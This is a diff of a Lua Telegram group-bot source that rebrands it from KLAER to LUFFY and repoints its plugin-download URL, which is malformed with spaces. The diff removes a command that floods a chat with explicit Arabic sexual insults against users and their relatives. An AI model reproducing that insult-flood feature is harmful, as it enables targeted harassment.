+local TextS = "\n ● اهلا بك في متجر ملفات كلير\n ● ملفات السورس ↓\n◤━───━??𝗼𝗼𝗼𝗻━───━◥\n\n"
+local TextE = "\n●○━━━━LUFFY━━━━○●\n ● علامة تعني { ✔️ } ملف مفعل\n ● علامة تعني { ✖ } ملف معطل\n ● قناة سورس كلير↓\n".." ● [اضغط هنا لدخول](t.me/Anime_ib) \n"
 local NumFile = 0
 for name,Info in pairs(res.plugins_) do
 local Check_File_is_Found = io.open("File_Bot/"..name,"r")
@@ -7298,13 +7298,13 @@ t = " ● الملف  ⇐ "..file.."\n ● تم تعطيل ملف \n"
 else
 t = " ● بالتاكيد تم تعطيل ملف → "..file.."\n"
 end
-local json_file, res = https.request("https://raw.githubusercontent.com/mostafanotbody/KLAER1/main/File_Bot/"..file)
+local json_file, res = https.request("https://raw.githubusercontent.com/LucasnotF A E D E R/LUFFY1/main/File_Bot/"..file)
 if res == 200 then
 os.execute("rm -fr File_Bot/"..file)
 send(msg.chat_id_, msg.id_,t) 
-dofile('KLAER.lua')  
+dofile('LUFFY.lua')  
 else
-send(msg.chat_id_, msg.id_," ● عذرا الملف لايدعم سورس لوفي\n") 
+send(msg.chat_id_, msg.id_," ● عذرا الملف لايدعم سورس كلير\n") 
 end
 return false
 end
@@ -7318,15 +7318,15 @@ t = " ● بالتاكيد تم تفعيل ملف → "..file.." \n"
 else
 t = " ● الملف  ⇐ "..file.."\n ● تم تفعيل ملف \n"
 end
-local json_file, res = https.request("https://raw.githubusercontent.com/mostafanotbody/KLAER1/main/File_Bot/"..file)
+local json_file, res = https.request("https://raw.githubusercontent.com/LucasnotF A E D E R/LUFFY1/main/File_Bot/"..file)
 if res == 200 then
 local chek = io.open("File_Bot/"..file,'w+')
 chek:write(json_file)
 chek:close()
 send(msg.chat_id_, msg.id_,t) 
-dofile('KLAER.lua')  
+dofile('LUFFY.lua')  
 else
-send(msg.chat_id_, msg.id_," ● عذرا الملف لايدعم سورس لوفي\n") 
+send(msg.chat_id_, msg.id_," ● عذرا الملف لايدعم سورس كلير\n") 
 end
 return false
 end
@@ -8402,18 +8402,18 @@ end;end,nil)
 return false
 end
 if text == ("رفع مساعد") and tonumber(msg.reply_to_message_id_) ~= 0 and SudoBot(msg) then
-function Function_KLAER(extra, result, success)
+function Function_LUFFY(extra, result, success)
 bot_data:del(ban_id.."msa3d:ban")
 bot_data:sadd(ban_id.."msa3d:ban", result.sender_user_id_)
 bot_data:set(ban_id.."id:msa3d:ban", result.sender_user_id_)
 Reply_Status(msg,result.sender_user_id_,"reply","● تم ترقيته مساعد في البوت")  
 end
-tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, Function_KLAER, nil)
+tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, Function_LUFFY, nil)
 return false 
 end
 if text and text:match("^رفع مساعد @(.*)$") and SudoBot(msg) then
 local username = text:match("^رفع مساعد @(.*)$")
-function Function_KLAER(extra, result, success)
+function Function_LUFFY(extra, result, success)
 if result.id_ then
 if (result and result.type_ and result.type_.ID == "ChannelChatInfo") then
 send(msg.chat_id_,msg.id_,"● عذرا عزيزي المستخدم هاذا معرف قناة يرجى استخدام الامر بصوره صحيحه !")   
@@ -8427,7 +8427,7 @@ else
 send(msg.chat_id_, msg.id_,"● لا يوجد حساب بهاذا المعرف")
 end
 end
-tdcli_function ({ID = "SearchPublicChat",username_ = username}, Function_KLAER, nil)
+tdcli_function ({ID = "SearchPublicChat",username_ = username}, Function_LUFFY, nil)
 return false 
 end
 if text and text:match("^رفع مساعد (%d+)$") and SudoBot(msg) then
@@ -8439,23 +8439,23 @@ Reply_Status(msg,userid,"reply","● تم ترقيته مساعد في البو�
 return false 
 end
 if text == ("تنزيل المساعد") and SudoBot(msg) then
-function Function_KLAER(extra, result, success)
+function Function_LUFFY(extra, result, success)
 local id = bot_data:get(ban_id.."id:msa3d:ban")
 Reply_Status(msg,id,"reply","● تم تنزيله من المساعد")  
 bot_data:del(ban_id.."msa3d:ban")
 bot_data:del(ban_id.."id:msa3d:ban")
 end
-tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, Function_KLAER, nil)
+tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, Function_LUFFY, nil)
 return false 
 end
 if text == ("تنزيل مساعد") and SudoBot(msg) then
-function Function_KLAER(extra, result, success)
+function Function_LUFFY(extra, result, success)
 local id = bot_data:get(ban_id.."id:msa3d:ban")
 Reply_Status(msg,id,"reply","● تم تنزيله من المساعد")  
 bot_data:del(ban_id.."msa3d:ban")
 bot_data:del(ban_id.."id:msa3d:ban")
 end
-tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, Function_KLAER, nil)
+tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, Function_LUFFY, nil)
 return false 
 end
 if text == "المساعد" or text == "مساعد" then
@@ -8505,16 +8505,16 @@ end
 end
 ------------------------------------------------------------------------ adddev2 sudog
 if text == ("رفع مطور ثانوي") and tonumber(msg.reply_to_message_id_) ~= 0 and msa3d(msg) then
-function Function_KLAER(extra, result, success)
+function Function_LUFFY(extra, result, success)
 bot_data:sadd(ban_id.."Dev:ban:2", result.sender_user_id_)
 Reply_Status(msg,result.sender_user_id_,"reply","● تم ترقيته مطور ثانوي في البوت")  
 end
-tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, Function_KLAER, nil)
+tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, Function_LUFFY, nil)
 return false 
 end
 if text and text:match("^رفع مطور ثانوي @(.*)$") and msa3d(msg) then
 local username = text:match("^رفع مطور ثانوي @(.*)$")
-function Function_KLAER(extra, result, success)
+function Function_LUFFY(extra, result, success)
 if result.id_ then
 if (result and result.type_ and result.type_.ID == "ChannelChatInfo") then
 send(msg.chat_id_,msg.id_,"● عذرا عزيزي المستخدم هاذا معرف قناة يرجى استخدام الامر بصوره صحيحه !")   
@@ -8526,7 +8526,7 @@ else
 send(msg.chat_id_, msg.id_,"● لا يوجد حساب بهاذا المعرف")
 end
 end
-tdcli_function ({ID = "SearchPublicChat",username_ = username}, Function_KLAER, nil)
+tdcli_function ({ID = "SearchPublicChat",username_ = username}, Function_LUFFY, nil)
 return false 
 end
 if text and text:match("^رفع مطور ثانوي (%d+)$") and msa3d(msg) then
@@ -8536,16 +8536,16 @@ Reply_Status(msg,userid,"reply","● تم ترقيته مطور ثانوي في 
 return false 
 end
 if text == ("تنزيل مطور ثانوي") and tonumber(msg.reply_to_message_id_) ~= 0 and msa3d(msg) then
-function Function_KLAER(extra, result, success)
+function Function_LUFFY(extra, result, success)
 bot_data:srem(ban_id.."Dev:ban:2", result.sender_user_id_)
 Reply_Status(msg,result.sender_user_id_,"reply","● تم تنزيله من المطور ثانويين")  
 end
-tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, Function_KLAER, nil)
+tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, Function_LUFFY, nil)
 return false 
 end
 if text and text:match("^تنزيل مطور ثانوي @(.*)$") and msa3d(msg) then
 local username = text:match("^تنزيل مطور ثانوي @(.*)$")
-function Function_KLAER(extra, result, success)
+function Function_LUFFY(extra, result, success)
 if result.id_ then
 bot_data:srem(ban_id.."Dev:ban:2", result.id_)
 Reply_Status(msg,result.id_,"reply","● تم تنزيله من المطور ثانويين")  
@@ -8553,7 +8553,7 @@ else
 send(msg.chat_id_, msg.id_,"● لا يوجد حساب بهاذا المعرف")
 end
 end
-tdcli_function ({ID = "SearchPublicChat",username_ = username}, Function_KLAER, nil)
+tdcli_function ({ID = "SearchPublicChat",username_ = username}, Function_LUFFY, nil)
 return false
 end  
 if text and text:match("^تنزيل مطور ثانوي (%d+)$") and msa3d(msg) then
@@ -9897,13 +9897,13 @@ send(msg.chat_id_, msg.id_,' هذا الامر لا يخصك')
 return false
 end
 local Text =[[
-تم تغير الكلمه الي لوفي اكتب لوفي وسوف يظهر لك بعض زراير اختار ماتريده 
-the source LUFFYthe best source on tele
+تم تغير الكلمه الي كلير اكتب كلير وسوف يظهر لك بعض زراير اختار ماتريده 
+the source LUFFY the best source on tele
 ]]
 keyboard = {} 
 keyboard.inline_keyboard = {
 {
-{text = 'source klaer', callback_data="t.me/Anime_ib"},
+{text = 'source LUFFY', callback_data="t.me/Anime_ib"},
 },
 }
 local msg_id = msg.id_/2097152/0.5
@@ -9911,7 +9911,7 @@ https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. 
 return false
 end 
 
-if text == 'لوفي' then
+if text == 'كلير' then
 if not Mod(msg) then
 send(msg.chat_id_, msg.id_,' هذا الامر لا يخصك')
 return false
@@ -12463,7 +12463,7 @@ local text =
 ' }\n'..' ●  الايدي  ⇐ { '..idgp..
 ' }\n'..' ●  الايدي بالصوره  ⇐ { '..idph..
 ' }\n'..' ●  الرفع  ⇐ { '..setadd..
-' }\n'..' ●  الحظر  ⇐ { '..DRGm..' }\n\n●○━━━━LUFFY━━━━○●\n ● قناة سورس لوفي↓\n━━━━━━━\n'
+' }\n'..' ●  الحظر  ⇐ { '..DRGm..' }\n\n●○━━━━LUFFY━━━━○●\n ● قناة سورس كلير↓\n━━━━━━━\n'
 keyboard = {} 
 keyboard.inline_keyboard = {{{text = 'اخفاء الاوامر', callback_data="/hide"}},}
 https.request("https://api.telegram.org/bot"..token..'/sendmessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape(text).."&reply_to_message_id=markdown&reply_markup="..JSON.encode(keyboard)) 
@@ -12650,96 +12650,6 @@ send(msg.chat_id_, msg.id_," ● تم تعطيل نسبه جمالك")
 return false end
 end
 
-if text == "حفل" or text == "نيكو" or text == "نيك كسمو" or text == "حفل عليه" then
-tdcli_function({ID="GetUser",user_id_=msg.sender_user_id_},function(extra,result,success)
-local t7fel = {
-'ههههههههههههههههههههههههههههههههههههههههه',
-'يشرموط',
-'يخول',
-'يبن الاحبه',
-'يخول يشرموط',
-'يبن المتناكه يبطيق',
-'يكسمك يبن الاحبه',
-'يديني كسم آلضحك',
-'يكسمك',
-'هكر انا',
-'سد يكسمك',
-'يبن الخول',
-'يمتناك يعرص',
-'يكس متناك',
-'كسختك جبت منو دم',
-'كسمك جبت منو دم',
-'كس ابوك جبت منو دم',
-'كسم امك الاحبه',
-'كسم الي ناكك',
-'كسم طيزك زبي م نافع يخرج',
-'كسمينك',
-'زبي م نافع يخرج من كسمك',
-'زبي',
-'كسمك',
-'كسختك',
-'يخول',
-'يعرص',
-'يمتهان',
-}
-send(msg.chat_id_,'['..t7fel[math.random(#t7fel)]..']')
-send(msg.chat_id_,'['..t7fel[math.random(#t7fel)]..']')
-send(msg.chat_id_,'['..t7fel[math.random(#t7fel)]..']')
-send(msg.chat_id_,'['..t7fel[math.random(#t7fel)]..']')
-send(msg.chat_id_,'['..t7fel[math.random(#t7fel)]..']')
-send(msg.chat_id_,'['..t7fel[math.random(#t7fel)]..']')
-send(msg.chat_id_,'['..t7fel[math.random(#t7fel)]..']')
-send(msg.chat_id_,'['..t7fel[math.random(#t7fel)]..']')
-send(msg.chat_id_,'['..t7fel[math.random(#t7fel)]..']')
-send(msg.chat_id_,'['..t7fel[math.random(#t7fel)]..']')
-send(msg.chat_id_,'['..t7fel[math.random(#t7fel)]..']')
-send(msg.chat_id_,'['..t7fel[math.random(#t7fel)]..']')
-send(msg.chat_id_,'['..t7fel[math.random(#t7fel)]..']')
-send(msg.chat_id_,'['..t7fel[math.random(#t7fel)]..']')
-send(msg.chat_id_,'['..t7fel[math.random(#t7fel)]..']')
-send(msg.chat_id_,'['..t7fel[math.random(#t7fel)]..']')
-send(msg.chat_id_,'['..t7fel[math.random(#t7fel)]..']')
-send(msg.chat_id_,'['..t7fel[math.random(#t7fel)]..']')
-send(msg.chat_id_,'['..t7fel[math.random(#t7fel)]..']')
-send(msg.chat_id_,'['..t7fel[math.random(#t7fel)]..']')
-send(msg.chat_id_,'['..t7fel[math.random(#t7fel)]..']')
-send(msg.chat_id_,'['..t7fel[math.random(#t7fel)]..']')
-send(msg.chat_id_, msg.reply_to_message_id_, 'البـدايـه ❤')
-send(msg.chat_id_, msg.reply_to_message_id_, 'كـسـمـك لاجـل صاصا مبرمجي ❤') 
-send(msg.chat_id_, msg.reply_to_message_id_, 'كـسـمـك لاجـل مرات فايدير ❤') 
-send(msg.chat_id_, msg.reply_to_message_id_, 'كـسـمـك لاجـل بنات فايدير ❤') 
-send(msg.chat_id_, msg.reply_to_message_id_, 'كـسـمـك لاجـل اخوات فايدير ❤') 
-send(msg.chat_id_, msg.reply_to_message_id_, 'كـسـمـك لاجـل فايدير ❤') 
-send(msg.chat_id_, msg.reply_to_message_id_, 'كـسـمـك لاجـل مرات صاصا ❤') 
-send(msg.chat_id_, msg.reply_to_message_id_, 'كـسـمـك لاجـل بنات صاصا ❤') 
-send(msg.chat_id_, msg.reply_to_message_id_, 'كـسـمـك لاجـل كساحه ❤') 
-send(msg.chat_id_, msg.reply_to_message_id_, 'كـسـمـك لاجـل نينجا ❤') 
-send(msg.chat_id_, msg.reply_to_message_id_, 'كـسـمـك لاجـل انك اتهنت ❤') 
-send(msg.chat_id_, msg.reply_to_message_id_, 'كـسـمـك لاجـل اسلام مافيا ❤') 
-send(msg.chat_id_, msg.reply_to_message_id_, 'كـسـمـك لاجـل لوكاس ❤') 
-send(msg.chat_id_, msg.reply_to_message_id_, 'كـسـمـك لاجـل فرعون ❤') 
-send(msg.chat_id_, msg.reply_to_message_id_, 'كـسـمـك لاجـل مرات لوكاس ❤') 
-send(msg.chat_id_, msg.reply_to_message_id_, 'كـسـمـك لاجـل بنات لوكاس ❤') 
-send(msg.chat_id_, msg.reply_to_message_id_, 'كـسـمـك لاجـل كسمك لاجل زبي ❤') 
-send(msg.chat_id_, msg.reply_to_message_id_, 'كـسـمـك لاجـل بوتات التلي ❤') 
-send(msg.chat_id_, msg.reply_to_message_id_, 'كـسـمـك لاجـل بدر ❤') 
-send(msg.chat_id_, msg.reply_to_message_id_, 'كـسـمـك لاجـل صاصا ❤') 
-send(msg.chat_id_, msg.reply_to_message_id_, 'كـسـمـك لاجـل التليجرام ❤') 
-send(msg.chat_id_, msg.reply_to_message_id_, 'كـسـمـك لاجـل '..result.first_name_..' ❤') 
-send(msg.chat_id_, msg.reply_to_message_id_, 'الـنـهـايـه ❤')
-send(msg.chat_id_, msg.id_, 'نكت دينمو 😂😂')
-send(msg.chat_id_, msg.id_, 'عد هعمل كام ريب 😂')
-send(msg.chat_id_, msg.reply_to_message_id_, 'ريب 1')
-send(msg.chat_id_, msg.reply_to_message_id_, 'ريب 2')
-send(msg.chat_id_, msg.reply_to_message_id_, 'ريب 3')
-send(msg.chat_id_, msg.reply_to_message_id_, 'ريب 4')
-send(msg.chat_id_, msg.reply_to_message_id_, 'ريب 5')
-send(msg.chat_id_, msg.reply_to_message_id_, 'مات 😂')
-send(msg.chat_id_, msg.reply_to_message_id_, 'كسم آلضحك 😂')
-send(msg.chat_id_, msg.id_, 'امسح بقي عشان ميحصلش حاجه للروم من الشتايم 😚')
-return false 
-end,nil)
-end
 
 if text == 'مسح الرابط' or text == 'مسح الرابط' then
 if Mod(msg) then     
@@ -12840,42 +12750,42 @@ end
 end
 if text and text == "منع" and msg.reply_to_message_id_ == 0 and Manager(msg)  then       
 send(msg.chat_id_, msg.id_," ● ارسل الكلمه لمنعها")  
-bot_data:set(ban_id.."KLAER1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_,"rep")  
+bot_data:set(ban_id.."LUFFY1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_,"rep")  
 return false  
 end    
 if text then   
-local tsssst = bot_data:get(ban_id.."KLAER1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_)  
+local tsssst = bot_data:get(ban_id.."LUFFY1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_)  
 if tsssst == "rep" then   
 send(msg.chat_id_, msg.id_," ● ارسل التحذير عند ارسال الكلمه")  
-bot_data:set(ban_id.."KLAER1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_,"repp")  
-bot_data:set(ban_id.."KLAER1:filtr1:add:reply2"..msg.sender_user_id_..msg.chat_id_, text)  
-bot_data:sadd(ban_id.."KLAER1:List:Filter"..msg.chat_id_,text)  
+bot_data:set(ban_id.."LUFFY1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_,"repp")  
+bot_data:set(ban_id.."LUFFY1:filtr1:add:reply2"..msg.sender_user_id_..msg.chat_id_, text)  
+bot_data:sadd(ban_id.."LUFFY1:List:Filter"..msg.chat_id_,text)  
 return false  end  
 end
 if text then  
-local test = bot_data:get(ban_id.."KLAER1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_)  
+local test = bot_data:get(ban_id.."LUFFY1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_)  
 if test == "repp" then  
 send(msg.chat_id_, msg.id_," ● تم منع الكلمه مع التحذير")  
-bot_data:del(ban_id.."KLAER1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_)  
-local test = bot_data:get(ban_id.."KLAER1:filtr1:add:reply2"..msg.sender_user_id_..msg.chat_id_)  
+bot_data:del(ban_id.."LUFFY1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_)  
+local test = bot_data:get(ban_id.."LUFFY1:filtr1:add:reply2"..msg.sender_user_id_..msg.chat_id_)  
 if text then   
-bot_data:set(ban_id.."KLAER1:Add:Filter:Rp2"..test..msg.chat_id_, text)  
+bot_data:set(ban_id.."LUFFY1:Add:Filter:Rp2"..test..msg.chat_id_, text)  
 end  
-bot_data:del(ban_id.."KLAER1:filtr1:add:reply2"..msg.sender_user_id_..msg.chat_id_)  
+bot_data:del(ban_id.."LUFFY1:filtr1:add:reply2"..msg.sender_user_id_..msg.chat_id_)  
 return false  end  
 end
 
 if text == "الغاء منع" and msg.reply_to_message_id_ == 0 and Manager(msg) then    
 send(msg.chat_id_, msg.id_," ● ارسل الكلمه الان")  
-bot_data:set(ban_id.."KLAER1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_,"reppp")  
+bot_data:set(ban_id.."LUFFY1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_,"reppp")  
 return false  end
 if text then 
-local test = bot_data:get(ban_id.."KLAER1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_)  
+local test = bot_data:get(ban_id.."LUFFY1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_)  
 if test and test == "reppp" then   
 send(msg.chat_id_, msg.id_," ● تم الغاء منعها")  
-bot_data:del(ban_id.."KLAER1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_)  
-bot_data:del(ban_id.."KLAER1:Add:Filter:Rp2"..text..msg.chat_id_)  
-bot_data:srem(ban_id.."KLAER1:List:Filter"..msg.chat_id_,text)  
+bot_data:del(ban_id.."LUFFY1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_)  
+bot_data:del(ban_id.."LUFFY1:Add:Filter:Rp2"..text..msg.chat_id_)  
+bot_data:srem(ban_id.."LUFFY1:List:Filter"..msg.chat_id_,text)  
 return false  end  
 end
 
@@ -12936,21 +12846,21 @@ tdcli_function ({ ID = "GetMessage", chat_id_ = msg.chat_id_, message_id_ = tonu
 end
 
 if text == "مسح قائمه المنع"and Manager(msg) then   
-local list = bot_data:smembers(ban_id.."KLAER1:List:Filter"..msg.chat_id_)  
+local list = bot_data:smembers(ban_id.."LUFFY1:List:Filter"..msg.chat_id_)  
 for k,v in pairs(list) do  
-bot_data:del(ban_id.."KLAER1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_)  
-bot_data:del(ban_id.."KLAER1:Add:Filter:Rp2"..v..msg.chat_id_)  
-bot_data:srem(ban_id.."KLAER1:List:Filter"..msg.chat_id_,v)  
+bot_data:del(ban_id.."LUFFY1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_)  
+bot_data:del(ban_id.."LUFFY1:Add:Filter:Rp2"..v..msg.chat_id_)  
+bot_data:srem(ban_id.."LUFFY1:List:Filter"..msg.chat_id_,v)  
 end  
 send(msg.chat_id_, msg.id_," ● تم مسح قائمه المنع")  
 end
 
 if text == "قائمه المنع" and Manager(msg) then   
-local list = bot_data:smembers(ban_id.."KLAER1:List:Filter"..msg.chat_id_)  
+local list = bot_data:smembers(ban_id.."LUFFY1:List:Filter"..msg.chat_id_)  
 t = "\n ● قائمة المنع \n●○━━━━LUFFY━━━━○●\n"
 for k,v in pairs(list) do  
-local KLAER_Msg = bot_data:get(ban_id.."KLAER1:Add:Filter:Rp2"..v..msg.chat_id_)   
-t = t..""..k.."- "..v.." ↭ {"..KLAER_Msg.."}\n"    
+local LUFFY_Msg = bot_data:get(ban_id.."LUFFY1:Add:Filter:Rp2"..v..msg.chat_id_)   
+t = t..""..k.."- "..v.." ↭ {"..LUFFY_Msg.."}\n"    
 end  
 if #list == 0 then  
 t = " ● لا يوجد كلمات ممنوعه"  
@@ -13666,9 +13576,9 @@ msg_type = 'MSG:NewUser'
 end
 
 
-if text == ""..(bot_data:get(ban_id..'Name:Bot') or 'لوفي').."" then  
-Namebot = (bot_data:get(ban_id..'Name:Bot') or 'لوفي')
-local KLAER_Msg = {
+if text == ""..(bot_data:get(ban_id..'Name:Bot') or 'كلير').."" then  
+Namebot = (bot_data:get(ban_id..'Name:Bot') or 'كلير')
+local LUFFY_Msg = {
 'ننعم يروحي 😻??',
 'نعم يا قلب  '..Namebot..'',
 'عاوز اي من '..Namebot..'',
@@ -13684,7 +13594,7 @@ local KLAER_Msg = {
 'انا '..Namebot..' احسن البوتات 🤩♥️',
 'نعم'
 } 
-Namebot = KLAER_Msg[math.random(#KLAER_Msg)] 
+Namebot = LUFFY_Msg[math.random(#LUFFY_Msg)] 
 local msg_id = msg.id_/2097152/0.5 
 local texxtt = ''..Namebot..''
 keyboard = {} 
@@ -13706,8 +13616,8 @@ end
 tdcli_function ({ ID = "GetUserProfilePhotos", user_id_ = ban_id, offset_ = 0, limit_ = 1 }, getpro, nil) 
 end
 if text == "بوت" then
-local Namebot = (bot_data:get(ban_id..'Name:Bot') or 'لوفي') 
-local KLAER_Msg = { 
+local Namebot = (bot_data:get(ban_id..'Name:Bot') or 'كلير') 
+local LUFFY_Msg = { 
 'اسمي  '..Namebot..' يا قلبي 🤤💚',
 'اسمي '..Namebot..' يا روحي🙈❤️',
 'اسمي  '..Namebot..' يعمري🌚🌹',
@@ -13719,7 +13629,7 @@ local KLAER_Msg = {
 'اسمي  '..Namebot..' ياحياتي🧸♥️',
 'اسمي  '..Namebot..' يوتكه🙈🍑',
 } 
-Namebot = KLAER_Msg[math.random(#KLAER_Msg)] 
+Namebot = LUFFY_Msg[math.random(#LUFFY_Msg)] 
 local msg_id = msg.id_/2097152/0.5  
 local texxtt =   ''..Namebot..''
 keyboard = {} 
@@ -14052,7 +13962,7 @@ local Text = [[
 ]]
 keyboard = {} 
 keyboard.inline_keyboard = {
-{{text = '𝚂𝙾𝚄𝚁𝙲𝙴 LUFFY', url="t.me/Anime_ib"}},
+{{text = 'S0URCE LUFFY', url="t.me/Anime_ib"}},
 }
 local msg_id = msg.id_/2097152/0.5
 https.request("https://api.telegram.org/bot"..token..'/sendvideo?chat_id=' .. msg.chat_id_ .. '&video=https://t.me/comxnxp/18&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
@@ -14062,7 +13972,7 @@ local Text = [[
 ]]
 keyboard = {} 
 keyboard.inline_keyboard = {
-{{text = '𝚂𝙾𝚄𝚁𝙲𝙴 LUFFY', url="t.me/Anime_ib"}},
+{{text = 'S0URCE LUFFY', url="t.me/Anime_ib"}},
 }
 local msg_id = msg.id_/2097152/0.5
 https.request("https://api.telegram.org/bot"..token..'/sendvideo?chat_id=' .. msg.chat_id_ .. '&video=https://t.me/comxnxp/19&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
@@ -14072,7 +13982,7 @@ local Text = [[
 ]]
 keyboard = {} 
 keyboard.inline_keyboard = {
-{{text = '𝚂𝙾𝚄𝚁𝙲𝙴 LUFFY', url="t.me/Anime_ib"}},
+{{text = 'S0URCE LUFFY', url="t.me/Anime_ib"}},
 }
 local msg_id = msg.id_/2097152/0.5
 https.request("https://api.telegram.org/bot"..token..'/sendsticker?chat_id=' .. msg.chat_id_ .. '&sticker=https://t.me/comxnxp/20&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
@@ -14083,7 +13993,7 @@ local Text = [[
 ]]
 keyboard = {} 
 keyboard.inline_keyboard = {
-{{text = '𝚂𝙾𝚄𝚁𝙲𝙴 LUFFY', url="t.me/Anime_ib"}},
+{{text = 'S0URCE LUFFY', url="t.me/Anime_ib"}},
 }
 local msg_id = msg.id_/2097152/0.5
 https.request("https://api.telegram.org/bot"..token..'/sendvideo?chat_id=' .. msg.chat_id_ .. '&video=https://t.me/comxnxp/21&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
@@ -14095,7 +14005,7 @@ local Text = [[
 ]]
 keyboard = {} 
 keyboard.inline_keyboard = {
-{{text = '𝚂𝙾𝚄𝚁𝙲𝙴 LUFFY', url="t.me/Anime_ib"}},
+{{text = 'S0URCE LUFFY', url="t.me/Anime_ib"}},
 }
 local msg_id = msg.id_/2097152/0.5
 https.request("https://api.telegram.org/bot"..token..'/sendsticker?chat_id=' .. msg.chat_id_ .. '&sticker=https://t.me/D_V1_D/94&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
@@ -14106,7 +14016,7 @@ local Text = [[
 ]]
 keyboard = {} 
 keyboard.inline_keyboard = {
-{{text = '𝚂𝙾𝚄𝚁𝙲𝙴 LUFFY', url="t.me/Anime_ib"}},
+{{text = 'S0URCE LUFFY', url="t.me/Anime_ib"}},
 }
 local msg_id = msg.id_/2097152/0.5
 https.request("https://api.telegram.org/bot"..token..'/sendsticker?chat_id=' .. msg.chat_id_ .. '&sticker=https://t.me/D_V1_D/93&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
@@ -14117,7 +14027,7 @@ local Text = [[
 ]]
 keyboard = {} 
 keyboard.inline_keyboard = {
-{{text = '𝚂𝙾𝚄𝚁𝙲𝙴 LUFFY', url="t.me/Anime_ib"}},
+{{text = 'S0URCE LUFFY', url="t.me/Anime_ib"}},
 }
 local msg_id = msg.id_/2097152/0.5
 https.request("https://api.telegram.org/bot"..token..'/sendsticker?chat_id=' .. msg.chat_id_ .. '&sticker=https://t.me/D_V1_D/95&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
@@ -14129,7 +14039,7 @@ local Text = [[
 ]]
 keyboard = {} 
 keyboard.inline_keyboard = {
-{{text = '𝚂𝙾𝚄𝚁𝙲𝙴 LUFFY', url="t.me/Anime_ib"}},
+{{text = 'S0URCE LUFFY', url="t.me/Anime_ib"}},
 }
 local msg_id = msg.id_/2097152/0.5
 https.request("https://api.telegram.org/bot"..token..'/sendanimation?chat_id=' .. msg.chat_id_ .. '&animation=https://t.me/D_V1_D/96&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
@@ -14342,7 +14252,7 @@ local ramsesj20 =  "\n التاريخ : "..os.date("%Y/%m/%d")
 send(msg.chat_id_, msg.id_,ramsesj20)
 end
 --------------
-if text == ""..(bot_data:get(ban_id..'Name:Bot') or 'لوفي').." غادر" or text == 'غادر' and Sudo(msg) then     
+if text == ""..(bot_data:get(ban_id..'Name:Bot') or 'كلير').." غادر" or text == 'غادر' and Sudo(msg) then     
 if Sudo(msg) and not bot_data:get(ban_id..'Left:Bot'..msg.chat_id_)  then 
 if not Bot(msg) then 
 tdcli_function ({ID = "ChangeChatMemberStatus",chat_id_=msg.chat_id_,user_id_=ban_id,status_={ID = "ChatMemberStatusLeft"},},function(e,g) end, nil) 
@@ -14353,7 +14263,7 @@ return false
 end
 end
 if text == 'الاحصائيات' and msa3d(msg) then 
-local Namebot = (bot_data:get(ban_id..'Name:Bot') or 'لوفي') 
+local Namebot = (bot_data:get(ban_id..'Name:Bot') or 'كلير') 
 local Groups = bot_data:scard(ban_id..'Chek:Groups')  
 local Users = bot_data:scard(ban_id..'User_Bot')  
 local getbioY = getbio(msg.sender_user_id_)
@@ -14385,7 +14295,7 @@ end
 tdcli_function ({ ID = "GetUserProfilePhotos", user_id_ = ban_id, offset_ = 0, limit_ = 1 }, getpro, nil) 
 end
